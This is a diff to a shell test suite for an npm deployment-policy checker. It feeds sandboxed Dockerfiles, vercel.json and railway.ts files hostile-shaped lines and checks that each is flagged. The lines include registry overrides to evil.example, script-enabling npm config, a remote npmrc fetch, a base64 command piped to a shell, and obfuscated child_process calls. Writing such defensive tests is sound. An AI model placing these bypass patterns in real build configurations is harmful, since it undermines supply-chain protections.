@@ -123,6 +123,7 @@ build_sandbox() {
 	mkdir -p "$SANDBOX/tree/scripts" "$SANDBOX/tree/apps/api" "$SANDBOX/tree/apps/web" "$SANDBOX/tree/tools/npm"
 	cp -- "$SCRIPT" "$SANDBOX/tree/scripts/check-npm-policy.sh"
 	cp -- "$HELPER" "$SANDBOX/tree/scripts/npm_policy.py"
+	cp -- "$ROOT/scripts/npm_policy_deploy.py" "$SANDBOX/tree/scripts/npm_policy_deploy.py"
 	(
 		cd -- "$SANDBOX/tree" || exit 1
 		git init -q .
@@ -135,8 +136,8 @@ build_sandbox() {
 		done
 		printf '{"private":true,"dependencies":{"npm":"12.2.2"}}\n' >tools/npm/package.json
 		printf '{"lockfileVersion":3,"packages":{"":{},"node_modules/npm":{"version":"12.2.2","resolved":"https://registry.npmjs.org/npm/-/npm-12.2.2.tgz","integrity":"sha512-BBBB"},"node_modules/npm/node_modules/semver":{"version":"7.0.0","inBundle":true}}}\n' >tools/npm/package-lock.json
-		printf 'registry=https://registry.npmjs.org/\nallow-git=none\n' >tools/npm/.npmrc
-		printf 'FROM node:26-alpine\nRUN cd /app/tools/npm && npm ci\nRUN /app/tools/npm/node_modules/.bin/npm ci\n' >apps/api/Dockerfile
+		printf 'registry=https://registry.npmjs.org/\nallow-git=none\nallow-file=none\nallow-directory=none\n' >tools/npm/.npmrc
+		printf 'FROM node:26-alpine\nWORKDIR /app\nRUN cd /app/tools/npm && npm ci\nRUN /app/tools/npm/node_modules/.bin/npm ci\n' >apps/api/Dockerfile
 		git add -- package-lock.json apps/api/package-lock.json apps/web/package-lock.json tools/npm/package-lock.json apps/api/Dockerfile
 	)
 }
@@ -295,33 +296,177 @@ printf '{"lockfileVersion":3,"packages":{"":{},"node_modules/npm":{"version":"12
 out="$(run_check)"
 rc=$?
 expect_fail "a bootstrap lockfile from outside the registry" "tools/npm: tools/npm/package-lock.json installs from outside the npm registry"
-build_sandbox
-printf 'FROM node:26-alpine\nRUN npm install -g npm@12.2.2\n' >"$SANDBOX/tree/apps/api/Dockerfile"
-out="$(run_check)"
-rc=$?
-expect_fail "a Dockerfile that fetches npm by version" "apps/api/Dockerfile: fetches npm itself"
-build_sandbox
-printf '{"installCommand":"npx -y npm@12.2.2 install"}\n' >"$SANDBOX/tree/vercel.json"
-(cd -- "$SANDBOX/tree" && git add -- vercel.json)
-out="$(run_check)"
-rc=$?
-expect_fail "a vercel.json that fetches npm by version" "vercel.json: fetches npm itself"
-
-for line in 'RUN npm install -g npm@latest' 'RUN npm i -g npm@^12' 'RUN npm install -g npm' 'RUN npx -y npm install'; do
+echo
+echo "check-npm-policy — deploy files use npm only in allowed shapes; anything else touching npm fails"
+# A literal $ and backtick, so no test string has to quote an expansion character.
+D=$(printf '\044')
+B=$(printf '\140')
+dockerfile_case() { # <fail|pass> <expected substring or ''> <Dockerfile text appended at line 5>
 	build_sandbox
-	printf '%s\n' "$line" >>"$SANDBOX/tree/apps/api/Dockerfile"
+	printf '%s\n' "$3" >>"$SANDBOX/tree/apps/api/Dockerfile"
 	out="$(run_check)"
 	rc=$?
-	expect_fail "a Dockerfile line '$line'" "apps/api/Dockerfile: fetches npm itself"
+	if [ "$1" = pass ]; then
+		if [ "$rc" -eq 0 ]; then ok "'$3' passes (control)"; else bad "'$3' was flagged: $out"; fi
+	else
+		expect_fail "a Dockerfile line '$3'" "$2"
+	fi
+}
+vercel_case() { # <fail|pass> <expected substring or ''> <vercel.json text>
+	build_sandbox
+	printf '%s\n' "$3" >"$SANDBOX/tree/vercel.json"
+	(cd -- "$SANDBOX/tree" && git add -- vercel.json)
+	out="$(run_check)"
+	rc=$?
+	if [ "$1" = pass ]; then
+		if [ "$rc" -eq 0 ]; then ok "vercel.json $3 passes (control)"; else bad "vercel.json $3 was flagged: $out"; fi
+	else
+		expect_fail "vercel.json $3" "$2"
+	fi
+}
+# Not an allowed npm shape: other npms, fetching npm, options that hide or change the install,
+# wrappers and shell keywords in front of npm, other package managers, config writes.
+for line in 'RUN npm install -g npm@12.2.2' 'RUN npm ci' 'RUN npm --prefix apps/api ci' 'RUN npm -w apps/api ci' "$(printf 'RUN npm\tci')" "$(printf 'RUN\tnpm ci')" \
+	'RUN ["npm", "ci"]' 'RUN npm ci&&npm run build' 'RUN npm --fetch-timeout 60000 ci' 'RUN npm --maxsockets 4 ci' \
+	'RUN cd /app/tools/npm && cd /app && npm ci' 'RUN cd /app/tools/npm && npm install left-pad' 'RUN cd /app/evil-tools/npm && npm ci' \
+	'RUN timeout 600 npm ci' 'RUN nice -n 5 npm ci' 'RUN env -S "npm ci"' 'RUN sudo -u root npm ci' 'RUN ! npm ci' \
+	'RUN npm config set dangerously-allow-all-scripts true' 'RUN npm install-scripts approve esbuild' \
+	'RUN export npm_config_dangerously_allow_all_scripts=true && /app/tools/npm/node_modules/.bin/npm ci' \
+	'RUN /app/tools/npm/node_modules/.bin/npm ci --dangerously-allow-all-scripts' 'RUN /app/tools/npm/node_modules/.bin/npm ci --registry=https://evil.example/' \
+	'RUN /app/tools/npm/node_modules/.bin/npm ci --userconfig=/tmp/x' 'RUN /app/tools/npm/node_modules/.bin/npm ci --allow-git=all' \
+	'RUN /app/tools/npm/node_modules/.bin/npm install left-pad' 'RUN npx -c "npm ci"' 'RUN npx --yes --package=npm npm --version' 'RUN npx -p npm@12 semver --help' \
+	'RUN corepack prepare npm@12 --activate' 'RUN corepack prepare pnpm@9 --activate' 'RUN pnpm install --frozen-lockfile' 'RUN yarn install' 'RUN bun install' \
+	'RUN echo a#b && npm install -g npm' "$(printf 'RUN apk add --no-cache curl \\\n# a comment line\n  && npm install left-pad')" \
+	'HEALTHCHECK --interval=5s CMD npm ci' 'CMD ["npm", "start"]' 'ENTRYPOINT npm start' \
+	'RUN eval "npm ci"' 'RUN xargs -n1 npm ci' 'RUN source /app/env.sh && npm run build' 'RUN . /app/env.sh' \
+	'RUN sh -c "npm ci"' 'RUN bash -lc "npm ci"' 'RUN ["sh", "-ec", "npm ci"]' "RUN sh -c 'n\\pm ci'" 'RUN true && sh build.sh' 'RUN sh build.sh' 'RUN nice sh -c true' \
+	'RUN /usr/local/bin/n?m install evil' 'RUN /usr/local/bin/n[p]m ci' 'RUN true && /usr/local/bin/np* ci' \
+	'RUN npm_config_dangerously_allow_all_scripts=true /app/tools/npm/node_modules/.bin/npm ci' \
+	'RUN /tmp/i' "RUN node -e \"require('child_process').execSync('n'+'pm ci')\"" 'RUN node --require ./x.js dist/a.js' \
+	'RUN cd /app/tools/npm && cd && npm ci' 'RUN cd /app/tools/npm && cd / extra && npm ci' 'RUN cd /evil/tools/npm && npm ci' 'RUN /evil/tools/npm/node_modules/.bin/npm ci' \
+	'RUN npm run build --registry=https://evil.example/' 'RUN npm run build --dangerously-allow-all-scripts' 'RUN /app/tools/npm/node_modules/.bin/npm run build --registry=https://evil.example/' \
+	'RUN apk add --no-cache curl' 'RUN rm -rf /var/cache/apk/*' 'CMD ["node", "-e", "1"]' 'RUN cd /tmp extra' \
+	"$(printf 'RUN cd /app \\\n\n  && npm install left-pad')" "$(printf 'WORKDIR /evil\nRUN cd /evil/tools/npm && npm ci')"; do
+	dockerfile_case fail "is not an allowed deploy command" "$line"
 done
+dockerfile_case fail "ONBUILD runs ${B}npm ci${B}" 'ONBUILD RUN npm ci'
+# Joins other than && make the order and the working directory unreadable.
+for line in 'RUN npm ci;' 'RUN cd /app/tools/npm || true; npm ci' 'RUN if true; then npm ci; fi' 'RUN { npm ci; }' \
+	'RUN 2>/dev/null npm ci' 'RUN echo "dangerously-allow-all-scripts=true" > /root/.npmrc' 'RUN npm ci | cat' 'RUN echo bnBtIGNp | base64 -d | env sh'; do
+	dockerfile_case fail "joins commands with" "$line"
+done
+# Constructs that compute what runs are refused outright, npm or not.
+for line in "RUN ${D}NPM ci" "RUN echo ${D}HOME" "RUN ${B}echo npm${B} ci" "RUN \"${D}(echo npm)\" ci" 'RUN <<EOF' 'RUN cat <<EOF >/tmp/x'; do
+	dockerfile_case fail "uses a dynamic shell construct" "$line"
+done
+dockerfile_case fail "ENV sets PATH" 'ENV PATH=/app/evil:/usr/bin'
+dockerfile_case fail "ENV sets HOME" 'ENV HOME /app/cfg'
+dockerfile_case fail "ARG sets NODE_OPTIONS" 'ARG NODE_OPTIONS=--require=./x.js'
+dockerfile_case fail "runs ${B}npm ci${B}" "$(printf 'RUN --network=none\tnpm\tci')"
 build_sandbox
-printf 'FROM node:26-alpine\nRUN npm ci\n' >"$SANDBOX/tree/apps/api/Dockerfile"
+printf '# escape=`\nFROM node:26-alpine\nRUN cd /app/tools/npm && npm ci\n' >"$SANDBOX/tree/apps/api/Dockerfile"
 out="$(run_check)"
 rc=$?
-expect_fail "a Dockerfile installing with the image's npm" "apps/api/Dockerfile: installs dependencies without the bootstrapped npm"
+expect_fail "a Dockerfile with an escape parser directive" "apps/api/Dockerfile sets an escape parser directive"
+dockerfile_case fail "ENV sets npm_config_dangerously_allow_all_scripts" 'ENV npm_config_dangerously_allow_all_scripts=true'
+dockerfile_case fail "ENV sets NPM_CONFIG_REGISTRY" 'ENV NPM_CONFIG_REGISTRY https://evil.example/'
+dockerfile_case fail "ENV sets NPM_CONFIG_USERCONFIG" 'ENV NPM_CONFIG_USERCONFIG=/app/evil'
+dockerfile_case fail "ENV sets npm_config_engine_strict" 'ENV npm_config_engine_strict=true'
+dockerfile_case fail "ARG sets npm_config_allow_scripts" 'ARG npm_config_allow_scripts'
+dockerfile_case fail "COPY names an npmrc" 'COPY evil.npmrc /root/.npmrc'
+dockerfile_case fail "ADD names an npmrc" 'ADD https://evil.example/npmrc /usr/local/etc/npmrc'
+dockerfile_case fail "ADD fetches from a URL" 'ADD https://registry.npmjs.org/npm/-/npm-12.2.2.tgz /x/n.tgz'
+dockerfile_case fail "SHELL changes how every RUN is interpreted" 'SHELL ["/bin/bash", "-c"]'
+dockerfile_case fail "exec-form RUN that is not valid JSON" 'RUN ["npm", "ci"'
+dockerfile_case fail "could not be parsed as a shell command" 'RUN npm ci "oops'
+dockerfile_case fail "exec-form RUN that is not a list of strings" 'RUN ["npm", 1]'
+dockerfile_case fail "ENV sets npm_config_token" 'ENV npm_config_token=s3cr3t-value'
+case "$out" in *s3cr3t-value*) bad "the ENV value was echoed: $out" ;; *) ok "  …without echoing the value" ;; esac
+# Controls: the shapes the repo uses, and commands that touch no npm.
+for line in 'RUN cd /app/tools/npm && npm ci --no-audit --no-fund' 'RUN /app/tools/npm/node_modules/.bin/npm run build' 'RUN npm run build' 'RUN npx tsc' \
+	'# RUN npm ci in a comment' 'RUN node --expose-gc dist/api/src/index.js' "$(printf 'RUN cd /app \\\n\n# note\n  && npm run build')" \
+	'CMD ["node", "--expose-gc", "dist/api/src/index.js"]' 'COPY tools/npm ./tools/npm' 'ENV NODE_ENV=production' 'HEALTHCHECK NONE' 'ENV NODE_ENV=production PORT=8000' 'ADD dist.tar.gz /app/'; do
+	dockerfile_case pass "" "$line"
+done
+vercel_case pass "" '{"installCommand":"(cd ../../tools/npm && npm ci --no-audit --no-fund) && ../../tools/npm/node_modules/.bin/npm ci && cd ../api && ../../tools/npm/node_modules/.bin/npm ci","buildCommand":"cd ../api && npx tsc && cd ../web && npm run build","devCommand":"npm run dev"}'
+vercel_case fail "vercel.json installCommand runs ${B}npm ci${B}, which is not an allowed deploy command" '{"installCommand":"(cd ../../tools/npm && npm ci) && npm ci"}'
+vercel_case fail "vercel.json installCommand runs ${B}npx -y npm@12.2.2 install${B}" '{"installCommand":"npx -y npm@12.2.2 install"}'
+vercel_case fail "vercel.json buildCommand uses a dynamic shell construct" '{"buildCommand":"true\nnpm install left-pad"}'
+vercel_case fail "vercel.json env sets NPM_CONFIG_DANGEROUSLY_ALLOW_ALL_SCRIPTS" '{"build":{"env":{"NPM_CONFIG_DANGEROUSLY_ALLOW_ALL_SCRIPTS":"true"}}}'
+vercel_case fail "vercel.json env sets npm_config_registry" '{"env":{"npm_config_registry":"https://evil.example/"}}'
+vercel_case fail "vercel.json is not a JSON object" '[]'
+vercel_case fail "vercel.json sets no installCommand" '{"buildCommand":"npm run build"}'
+vercel_case fail "vercel.json installCommand is not a string" '{"installCommand":["npm","ci"]}'
+vercel_case fail "vercel.json is not valid JSON" '{"installCommand":'
+vercel_case fail "vercel.json buildCommand could not be parsed as a shell command" '{"buildCommand":"npm run build \"oops"}'
+echo
+echo "npm_policy.py parse-ls — output it cannot read is an error, never an empty list"
+for input in '{"allowScripts":{}}' '{"allowScripts":[{"name":""}]}' 'not json' '{}'; do
+	printf '%s' "$input" | python3 -I "$HELPER" parse-ls >/dev/null 2>&1
+	rc=$?
+	if [ "$rc" -eq 2 ]; then ok "parse-ls refuses $input with exit 2"; else bad "parse-ls gave exit $rc for $input"; fi
+done
+if [ "$(printf '%s' '{"allowScripts":[{"name":"esbuild"}]}' | python3 -I "$HELPER" parse-ls)" = esbuild ]; then ok "parse-ls prints an undecided name (control)"; else bad "parse-ls lost a name"; fi
+# Which files: any Dockerfile or Containerfile spelling, and what railway.ts builds from.
+for name in Containerfile Dockerfile.prod Dockerfile-prod Dockerfile_prod api.dockerfile api.containerfile; do
+	build_sandbox
+	printf 'FROM node:26-alpine\nRUN npm ci\n' >"$SANDBOX/tree/apps/api/$name"
+	(cd -- "$SANDBOX/tree" && git add -- "apps/api/$name")
+	out="$(run_check)"
+	rc=$?
+	expect_fail "a tracked $name" "apps/api/$name:2 runs \`npm ci\`"
+done
 build_sandbox
-printf 'RUN corepack prepare pnpm@9 --activate\n' >>"$SANDBOX/tree/apps/api/Dockerfile"
-if out="$(run_check)"; then ok "pnpm@9 is not mistaken for npm (control)"; else bad "pnpm@9 was flagged: $out"; fi
+mkdir -p "$SANDBOX/tree/.railway"
+printf 'FROM node:26-alpine\nRUN npm ci\n' >"$SANDBOX/tree/apps/api/build.recipe"
+printf "export default { build: { dockerfilePath: 'apps/api/build.recipe' } }\n" >"$SANDBOX/tree/.railway/railway.ts"
+(cd -- "$SANDBOX/tree" && git add -- apps/api/build.recipe .railway/railway.ts)
+out="$(run_check)"
+rc=$?
+expect_fail "the file railway.ts builds from, whatever its name" "apps/api/build.recipe:2 runs ${B}npm ci${B}"
+for ts in "export default { build: { dockerfilePath: 'apps/api/Dockerfile' } } // then npm ci" "export default { start: 'n\\u0070m ci' }" "export default { build: { dockerfilePath: 'apps/api/Missing' } }" "export default { build: { dockerfilePath: ${B}apps/${D}{x}${B} } }" "export default { start: 'npm install -g npm && node x.js' }" "export default { start: ${B}npm ci${B} }" "export default { start: cmd }" "export default { deploy: { startCommand: 'npm install evil' } }" "export default { build: { builder: 'NIXPACKS' } }"; do
+	build_sandbox
+	mkdir -p "$SANDBOX/tree/.railway"
+	printf '%s\n' "$ts" >"$SANDBOX/tree/.railway/railway.ts"
+	(cd -- "$SANDBOX/tree" && git add -- .railway/railway.ts)
+	out="$(run_check)"
+	rc=$?
+	case "$ts" in
+	*"then npm ci"*) want=".railway/railway.ts mentions a package manager" ;;
+	*u0070*) want=".railway/railway.ts sets start with an escape sequence" ;;
+	*Missing*) want=".railway/railway.ts builds from apps/api/Missing, which is not a tracked file" ;;
+	*dockerfilePath*) want=".railway/railway.ts sets dockerfilePath to" ;;
+	*"start: ${B}"*) want=".railway/railway.ts sets start to" ;;
+	*"start: cmd"*) want=".railway/railway.ts sets start to 'cmd" ;;
+	*startCommand*) want=".railway/railway.ts sets startCommand" ;;
+	*NIXPACKS*) want=".railway/railway.ts uses builder NIXPACKS" ;;
+	*) want=".railway/railway.ts start runs ${B}npm install -g npm${B}" ;;
+	esac
+	expect_fail "a railway.ts with: $ts" "$want"
+done
+build_sandbox
+printf 'FROM node:26-alpine\nRUN npm ci\n' >"$SANDBOX/outside.Dockerfile"
+(cd -- "$SANDBOX/tree" && git rm -q --cached apps/api/Dockerfile && rm -f -- apps/api/Dockerfile && ln -s ../../../outside.Dockerfile apps/api/Dockerfile && git add -- apps/api/Dockerfile)
+out="$(run_check)"
+rc=$?
+expect_fail "a Dockerfile that is a symlink" "apps/api/Dockerfile could not be read (is a symlink"
+build_sandbox
+printf 'FROM node:26-alpine\nRUN \377\376\n' >"$SANDBOX/tree/apps/api/Dockerfile"
+out="$(run_check)"
+rc=$?
+expect_fail "a Dockerfile that is not UTF-8" "apps/api/Dockerfile could not be read (is not UTF-8"
+build_sandbox
+(cd -- "$SANDBOX/tree" && git rm -q -f -- apps/api/Dockerfile) || bad "could not remove the sandbox Dockerfile"
+out="$(run_check)"
+rc=$?
+expect_fail "a tree with no deploy file" "found no deploy file to check"
+
+build_sandbox
+printf 'allow-scripts.esbuild=true\n' >>"$SANDBOX/tree/apps/web/.npmrc"
+out="$(run_check)"
+rc=$?
+expect_fail "a dotted allow-scripts.<pkg> line" "apps/web: apps/web/.npmrc sets allow-scripts.esbuild, which lets install scripts run"
+
 build_sandbox
 printf 'allow-git=none\n' >"$SANDBOX/tree/tools/npm/.npmrc"
 out="$(run_check)"
@@ -332,6 +477,16 @@ printf 'dangerously-allow-all-scripts=true\n' >>"$SANDBOX/tree/tools/npm/.npmrc"
 out="$(run_check)"
 rc=$?
 expect_fail "a bootstrap .npmrc that lets scripts run" "tools/npm: tools/npm/.npmrc sets dangerously-allow-all-scripts"
+build_sandbox
+printf 'registry=https://registry.npmjs.org/\nallow-git=all\nallow-file=none\nallow-directory=none\n' >"$SANDBOX/tree/tools/npm/.npmrc"
+out="$(run_check)"
+rc=$?
+expect_fail "a bootstrap .npmrc that allows git dependencies" "tools/npm: tools/npm/.npmrc sets allow-git=all; it must be none"
+build_sandbox
+printf 'userconfig=/tmp/evil\n' >>"$SANDBOX/tree/tools/npm/.npmrc"
+out="$(run_check)"
+rc=$?
+expect_fail "a bootstrap .npmrc pointing at another config" "tools/npm: tools/npm/.npmrc sets userconfig; the bootstrap .npmrc may set only"
 build_sandbox
 printf '{"lockfileVersion":3,"packages":{"":{},"node_modules/npm":{"version":"12.2.2","resolved":"https://registry.npmjs.org/npm/-/npm-12.2.2.tgz","integrity":"sha512-B","hasInstallScript":true}}}\n' >"$SANDBOX/tree/tools/npm/package-lock.json"
 out="$(run_check)"
